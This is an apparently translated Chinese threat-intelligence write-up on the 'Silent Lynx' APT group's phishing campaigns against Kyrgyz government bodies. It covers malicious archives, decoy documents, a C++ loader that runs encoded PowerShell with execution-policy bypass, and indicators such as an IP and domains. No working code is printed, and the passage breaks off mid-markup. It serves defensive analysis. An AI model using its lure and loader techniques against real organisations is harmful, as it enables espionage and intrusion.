+<h2 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h2><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/ac3c6447-9bfd-4d37-9ad3-1685ed081b01-20250122092744-mwjqawt.png" class="" title="ac3c6447-9bfd-4d37-9ad3-1685ed081b01-20250122092744-mwjqawt">
+
+
+<h1 id="活动一"><a href="#活动一" class="headerlink" title="活动一"></a>活动一</h1><table>
+<thead>
+<tr>
+<th>文件类型</th>
+<th>文件名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>RAR</td>
+<td>20241228140656.rar</td>
+<td>包含恶意文件的压缩包</td>
+</tr>
+<tr>
+<td>PDF</td>
+<td>2024 - 00178nv Note Verbale SPECA WG_2024</td>
+<td>诱饵文档</td>
+</tr>
+<tr>
+<td>EXE</td>
+<td>20241228140656.iso</td>
+<td>恶意 ISO 文件，包含恶意可执行文件和诱饵文档</td>
+</tr>
+<tr>
+<td>EXE</td>
+<td>Xerox_Scan17510875802718752175.exe</td>
+<td>恶意 C++ 可执行文件，用于启动恶意 PowerShell 进程</td>
+</tr>
+<tr>
+<td>其他信息</td>
+<td>PowerShell、Telegram Bot、south korea、south_africa、PasteBin 1010 等</td>
+<td>涉及恶意脚本执行、通信及相关信息</td>
+</tr>
+</tbody></table>
+<h3 id="初步调查结果"><a href="#初步调查结果" class="headerlink" title="初步调查结果"></a>初步调查结果</h3><pre><code class="hljs">2024 年 12 月 27 日，团队发现了一封针对吉尔吉斯共和国国家银行一位官员的恶意 Outlook 邮件。该邮件包含一个名为 20241228_140656.rar 的 RAR 压缩附件。在检查这个 RAR 文件时，我们发现了一个名为 20241228_140656.iso 的恶意 ISO 文件。这个 ISO 文件包含一个名为 Xerox_Scan17510875802718752175.exe 的恶意可执行文件，它会启动一个 PowerShell 进程。恶意 PowerShell 进程的参数以 Base64 编码形式嵌入在 C++ 可执行文件中。此外，该 ISO 文件还释放出一个名为 2024 - 00178nv Note Verbale_SPECA WG_2024 的诱饵文档。次日，其他威胁研究人员也发现了同样的文件。
+</code></pre>
+<h3 id="恶意电子邮件分析"><a href="#恶意电子邮件分析" class="headerlink" title="恶意电子邮件分析"></a>恶意电子邮件分析</h3><pre><code class="hljs">查看这封恶意 Outlook 邮件后，我们明显发现威胁行为者使用了吉尔吉斯国家银行一名员工被攻陷的电子邮件账户。他们利用这个账户发送恶意 RAR 文件，并附上一条引人注意的消息，称该邮件本应发送给财政部，但却被他们收到了。现在，让我们来看看恶意 ISO 文件释放的诱饵 PDF 文档。
+</code></pre>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/6dc56b26-e7ea-4cc1-a40a-ffeb4b89a66b-20250122093059-m8wjpl7.png" class="" title="6dc56b26-e7ea-4cc1-a40a-ffeb4b89a66b-20250122093059-m8wjpl7">
+
+
+<h3 id="诱饵文档分析"><a href="#诱饵文档分析" class="headerlink" title="诱饵文档分析"></a>诱饵文档分析</h3><pre><code class="hljs">提取 ISO 文件后，我们识别出两个文件：一个恶意 C++ 可执行文件和一个诱饵文件。诱饵文件是一份参加 2024 年 4 月 3 日在乌兹别克斯坦撒马尔罕举行的中亚经济特别计划（SPECA）贸易工作组第十九届会议的邀请函。该文档模仿了联合国亚洲及太平洋经济社会委员会（ESCAP）的正式通信，利用 “利用数字化推动可持续供应链” 这一主题，使其看起来可信且具有相关性。由于吉尔吉斯斯坦是 SPECA 成员国之一，这种策略降低了人们的怀疑。
+</code></pre>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122093322-r6wxrru.png" class="" title="image-20250122093322-r6wxrru">
+
+
+
+<h1 id="活动二"><a href="#活动二" class="headerlink" title="活动二"></a>活动二</h1><table>
+<thead>
+<tr>
+<th>文件类型</th>
+<th>文件名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>RAR</td>
+<td>npka3 N9950 - 2 - o npemvpoBaH.rar</td>
+<td>包含恶意文件的压缩包，受密码保护</td>
+</tr>
+<tr>
+<td>PDF</td>
+<td>Приказ №950 - 2 - ГП о премировании</td>
+<td>诱饵文档，看似是吉尔吉斯共和国财政部发布的官方文件</td>
+</tr>
+<tr>
+<td>EXE</td>
+<td>Приложение №14 - 214 - 14 - 12 - 5 - 15docx</td>
+<td>恶意 Golang 可执行文件</td>
+</tr>
+<tr>
+<td>其他信息</td>
+<td>185.122.171.22:8082、Google Drive、<a target="_blank" rel="noopener" href="https://pweobmxdlboi.com/">pweobmxdlboi.com</a>、document.hometowncity.cloud、<a target="_blank" rel="noopener" href="https://mailboxdownload.com/">mailboxdownload.com</a>等</td>
+<td>涉及服务器地址、云存储及恶意域名信息</td>
+</tr>
+</tbody></table>
+<h3 id="恶意电子邮件分析-1"><a href="#恶意电子邮件分析-1" class="headerlink" title="恶意电子邮件分析"></a>恶意电子邮件分析</h3><p>查看第二次活动中的恶意 Outlook 邮件，我们发现威胁行为者使用了与第一次活动完全相同的被攻陷的电子邮件账户。这次，他们发送了一个受密码保护的 RAR 文件，并附上一条以员工奖金为诱饵的紧急消息，目标是吉尔吉斯共和国财政部的员工。现在，让我们来看看从 RAR 文件中提取出的诱饵 PDF 文档。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105119-umhizqx.png" class="" title="image-20250122105119-umhizqx">
+
+
+<h3 id="诱饵文档分析-1"><a href="#诱饵文档分析-1" class="headerlink" title="诱饵文档分析"></a>诱饵文档分析</h3><p>提取恶意 RAR 文件后，我们发现了两个文件：一个名为Приложение №14 - 214 - 14 - 12 - 5 - 15docx 的恶意 Golang 可执行文件和一个名为Приказ №950 - 2 - ГП о премировании的诱饵 Word 文档。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105215-71evgop.png" class="" title="image-20250122105215-71evgop">
+
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105240-lwvmt0y.png" class="" title="image-20250122105240-lwvmt0y">
+
+<p>诱饵文档看似是吉尔吉斯共和国财政部发布的官方命令，详细说明了员工奖金的分配情况。它包含了多名员工的姓名以及命令发布日期 2025 年 1 月 8 日，使这个诱饵看起来既及时又相关。为了增强其合法性并减少怀疑，文档末尾还列出了一位政府官员的姓名。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105248-5htdfs1.png" class="" title="image-20250122105248-5htdfs1">
+
+<h1 id="技术分析"><a href="#技术分析" class="headerlink" title="技术分析"></a>技术分析</h1><h2 id="活动一-1"><a href="#活动一-1" class="headerlink" title="活动一"></a>活动一</h2><p><strong>第一阶段 —— 恶意 ISO 文件</strong>：RAR 文件包含一个名为 20241228_140656.iso 的恶意 ISO 文件。提取该 ISO 文件后，我们发现了一个诱饵 PDF 文档和一个恶意 C++ 二进制文件，后者充当加载器。接下来，我们将分析这个 C++ 二进制文件。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105429-vvjjlrc.png" class="" title="image-20250122105429-vvjjlrc">
+
+<p><strong>第二阶段 —— 恶意 C++ 加载器</strong>：在直接进行分析之前，我们可以确定该样本未被打包，是一个 C++ 二进制文件。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105454-50hmzzq.png" class="" title="image-20250122105454-50hmzzq">
+
+<p>分析后我们发现，恶意 C++ 可执行文件中存在一大段 Base64 编码的内容，并且有一个 PowerShell 命令，该命令使用 -ExecutionPolicy Bypass 标志运行编码脚本，从而实现无限制的脚本执行。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload 